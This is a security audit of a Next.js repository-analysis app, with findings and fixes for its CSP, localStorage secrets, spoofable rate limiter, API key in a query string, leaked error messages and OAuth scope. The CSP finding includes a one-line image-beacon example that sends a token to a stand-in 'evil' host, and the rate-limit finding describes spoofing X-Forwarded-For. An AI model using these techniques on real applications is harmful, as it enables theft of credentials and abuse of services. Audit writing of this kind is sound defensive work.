# Security: Server Routes, Secrets & CSP — Improvement Notes

_Honest summary: the server surface is genuinely solid — SSRF is effectively closed and OAuth secrets are handled correctly server-side. The real weaknesses are defense-in-depth: a CSP that undercuts itself while all user secrets sit in localStorage, and a rate limiter that is trivially bypassable with several unauthenticated routes uncovered. Nothing here is remote-code-execution or server-side data loss._

Severity legend: **Critical** (exploit now, severe impact) · **High** (likely exploit or severe blast radius) · **Medium** (real weakness, bounded or needs a precondition) · **Low** (hygiene / hardening).

## Overall assessment

The core SSRF story is closed and I verified it independently, not on faith. Every GitHub proxy route validates `owner`/`repo` against `GITHUB_NAME_RE` (`lib/github/validation.ts:5`) and every URL in `lib/github/fetcher.ts` pins the host to `https://api.github.com` and wraps every interpolated segment — owner, name, ref, base, head, sha — in `encodeURIComponent` (fetcher.ts:159, 187, 209, 253, 276, 400, 602+). The `deps` routes pin to the npm/OSV hosts and gate package names through an npm-name regex (`app/api/deps/route.ts:14`, `app/api/deps/cve/route.ts:14`). AI provider base URLs are hardcoded, so there is no user-controlled outbound endpoint anywhere. OAuth `accessToken` lives only in the NextAuth JWT and is explicitly never copied into the client session (`lib/auth/config.ts:39-44`), and `getAccessToken` runs server-side only (`lib/auth/token.ts`).

What remains is two structural weaknesses and three hygiene issues. The two that matter: (1) `script-src` keeps both `'unsafe-inline'` and `'unsafe-eval'` while every user secret — all AI API keys plus a full `repo`-scope GitHub PAT — sits in plaintext localStorage, so any future XSS foothold means total secret compromise; and (2) the rate limiter keys on a client-spoofable header and four unauthenticated routes have no limit at all. I kept all five proposed findings (none were false positives) but downgraded the CSP finding from High to Medium, because the specific rendering paths the first reviewer flagged as XSS vectors are in fact guarded — the issue is blast radius, not a live hole.

## Findings

### [Medium] CSP allows `unsafe-inline` + `unsafe-eval` while all secrets live in localStorage (blast-radius, not a live XSS)

- **Where:** `next.config.mjs:44` (`script-src`), `next.config.mjs:48` (`img-src 'https:'`), `lib/api-keys/key-storage.ts:30-32` (`saveKeys`), `lib/github-token/index.ts:13-15` (`saveGitHubToken`), `components/ui/markdown-renderer.tsx:258` and `:291-330` (`dangerouslySetInnerHTML` / Mermaid).
- **Problem:** `script-src` retains `'unsafe-inline'` and `'unsafe-eval'`, so the CSP provides essentially no protection against script injection if one ever lands. Meanwhile AI API keys and the GitHub PAT are stored in plaintext localStorage. Separately, `img-src` is `'https:'` (blanket), so even though `connect-src` is correctly narrowed to GitHub/jsdelivr, an injected script could still beacon secrets out via `new Image().src = 'https://evil/?k=' + token` — the `connect-src` barrier is defeated by the image channel.
- **Honest correction to the first review:** the cited rendering paths are actually safe today. `MarkdownRenderer` uses `react-markdown` with only `remark-gfm` and **no** `rehype-raw`, so raw HTML in repo/AI content is escaped, not executed. Shiki's `codeToHtml` emits escaped HTML from source text, and Mermaid runs with `securityLevel: "strict"` (markdown-renderer.tsx:296). So I could not find a live XSS — this is a defense-in-depth finding, and its severity is the blast radius, not an exploit in hand.
- **Impact:** If any script injection ever occurs (a compromised npm dependency in the client bundle, a future addition of `rehype-raw`, a Shiki/Mermaid CVE), it reads localStorage and exfiltrates every AI key **and** a GitHub PAT carrying full `repo` scope (read/write to all private repos). `unsafe-eval` + `unsafe-inline` + `img-src https:` mean the CSP does nothing to blunt it. One XSS = total secret and private-repo compromise.
- **Recommendation:**
  1. Drop `'unsafe-eval'`. Shiki only needs `'wasm-unsafe-eval'` (already present). If Mermaid still requires `eval`, isolate diagram rendering in a sandboxed worker/iframe rather than granting page-wide eval — verify with the current Mermaid 11 build before assuming it's needed.
  2. Tighten `img-src` off blanket `'https:'` to the hosts you actually load images from (`avatars.githubusercontent.com`, `data:`, `blob:`), closing the beacon-exfil channel.
  3. Move secrets out of localStorage — memory-only for the session, or at minimum keep the full-scope PAT out of persistent JS-readable storage (see the OAuth-scope finding; a read-only token also shrinks this blast radius).
  4. `'unsafe-inline'` in `script-src` is the hardest to remove (Next.js bootstrap); migrate to nonces/hashes when practical, but treat 1–3 as the near-term wins.
- **Effort:** L · **Confidence:** med

### [Medium] Rate limiter is spoofable and per-instance; `models/*` and `deps/*` have no limit at all

- **Where:** `lib/api/rate-limit.ts:89-100` (`getClientIp` takes first XFF value), `lib/api/rate-limit.ts:30` (in-process `Map`), and uncovered routes: `app/api/models/{openai,openrouter,google,anthropic}/route.ts`, `app/api/deps/route.ts:187`, `app/api/deps/cve/route.ts:33`.
- **Problem:** Verified — `getClientIp` returns `forwarded.split(',')[0]`, the leftmost (client-supplied) `X-Forwarded-For` value, so an attacker rotating `X-Forwarded-For: <random>` per request never accumulates against any bucket. The store is a per-process `Map` that resets on cold start and is not shared across serverless instances, multiplying the effective limit by instance count. Separately, I confirmed the four `models/*` routes and both `deps` routes call `applyRateLimit` nowhere, while `chat`, `docs/generate`, `inline-actions`, `changelog/generate`, `compare`, `blame`, and the other github routes all do.
- **Impact:**
  - Spoofing XFF defeats the abuse controls on the AI routes (`chat`, `docs`, `inline-actions`) that *do* apply limits.
  - `/api/deps` is a request-amplification vector: one request fans out up to 200 packages × 3 upstream fetches ≈ 600 outbound requests (concurrency-capped at 10), burning function time and risking the deploy's egress IP getting throttled by npm. `/api/deps/cve` accepts up to 1000 packages to OSV.
  - `/api/models/*` is a free, anonymizing key-validation oracle: server is the egress and it echoes valid/invalid for a submitted provider key. Note `models/anthropic` goes further — it POSTs a real `max_tokens:1` message to `/v1/messages` (route.ts:25-37), so each probe also spends a trace of the key owner's credit.
- **Recommendation:** Derive the client IP from the platform-provided value (Vercel's `request.ip` / the rightmost trusted hop) rather than the leftmost XFF entry. Back the limiter with a shared store (Upstash/Vercel KV/Redis) if limits must hold across instances. Add `applyRateLimit` to all `models/*`, `deps`, and `deps/cve` handlers, and lower the `deps` fan-out cap (200 is generous for an unauthenticated route).
- **Effort:** M · **Confidence:** high

### [Low] Google model-list route puts the user's API key in the URL query string

- **Where:** `app/api/models/google/route.ts:24-26`.
- **Problem:** Confirmed — the route builds `https://generativelanguage.googleapis.com/v1beta/models?key=${parsed.data.apiKey}`, embedding the secret in the query string. The sibling OpenAI/OpenRouter routes correctly use an `Authorization: Bearer` header. Secrets in URLs get captured in server access logs, proxy logs, and any telemetry that records request URLs, and it contradicts the project's own "never put sensitive data in query strings" stance.
- **Impact:** The user's Google Generative AI key can persist in logs on the server side and any intermediary, broadening exposure beyond in-transit-only. Bounded because it's server→Google over TLS, but it's a persistent-log exposure the other providers avoid.
- **Recommendation:** Send the key via the `x-goog-api-key` request header instead of the query string, matching the header pattern used by the other model routes.
- **Effort:** S · **Confidence:** high

### [Low] A few routes return raw exception/upstream messages to the client

- **Where:** `app/api/inline-actions/route.ts:91` (returns `error.message` in the 500 body), `app/api/github/validate-token/route.ts:62-63` (raw `error.message`), `app/api/github/compare/route.ts:57` (bubbles the raw fetcher `message` into the 500). Contrast the correct pattern at `app/api/github/blame/route.ts:63` ("Failed to fetch blame data", detail logged server-side only).
- **Problem:** Confirmed and inconsistent with the codebase's own convention. Most routes return a fixed generic string on the 500 path and `console.error` the detail; these three leak the raw AI-SDK/provider/fetch exception text to any caller.
- **Impact:** Exception messages can expose internal detail (upstream endpoint shapes, provider-side error text, library internals) that aids reconnaissance. Bounded — these messages are unlikely to contain the API key itself — but it's needless surface and inconsistent.
- **Recommendation:** Return a fixed generic message to the client and `console.error` the detail server-side only, mirroring `blame`/`chat`/`docs`. Standardize the catch blocks.
- **Effort:** S · **Confidence:** med

### [Low] GitHub OAuth requests full `repo` scope for a read-only analysis tool

- **Where:** `lib/auth/config.ts:26` (`scope: "repo read:user"`).
- **Problem:** Confirmed. Classic `repo` scope grants full read **and write** to all of the user's private repositories, but RepoLens only ever reads metadata/contents/zipballs. The resulting `access_token` is stored in the JWT cookie and used as a bearer token by the github proxy routes.
- **Impact:** If the session cookie/JWT is ever exposed (the cookie is httpOnly, mitigating XSS, but token theft via other vectors or a leaked `NEXTAUTH_SECRET` remains possible), the attacker gets **write** access to every private repo, not just read. Privilege granted vastly exceeds what the features use. This compounds the CSP finding: a smaller scope shrinks that blast radius too.
- **Recommendation:** Reduce to least privilege. There is no classic read-only scope that covers private repos, so prefer GitHub fine-grained tokens (read-only "Contents"/"Metadata"), or if staying on classic OAuth, document why `repo` is the minimum and keep the token strictly server-side. Note the PAT path (`lib/github-token`) lets users supply their own token — encourage a read-only fine-grained PAT there in the UI copy.
- **Effort:** S · **Confidence:** med

## Suggested order of work

1. **Add `applyRateLimit` to `models/*`, `deps`, and `deps/cve`** and fix `getClientIp` to use the platform IP / rightmost hop — cheap, closes the abuse/oracle/amplification surface. (Medium #2)
2. **Move the Google key to the `x-goog-api-key` header** — one-line, stops key-in-logs. (Low #3)
3. **Standardize catch blocks to generic client messages + server-side logging** in `inline-actions`, `validate-token`, `compare`. (Low #4)
4. **CSP hardening:** drop `'unsafe-eval'` (verify Mermaid first), tighten `img-src` off blanket `https:`. (Medium #1)
5. **Reduce OAuth scope** to read-only (fine-grained token), which also shrinks the CSP blast radius. (Low #5)
6. **Longer term:** get secrets out of persistent localStorage and migrate `script-src` to nonces to make the remaining `'unsafe-inline'` removable. (Medium #1, the hard part)
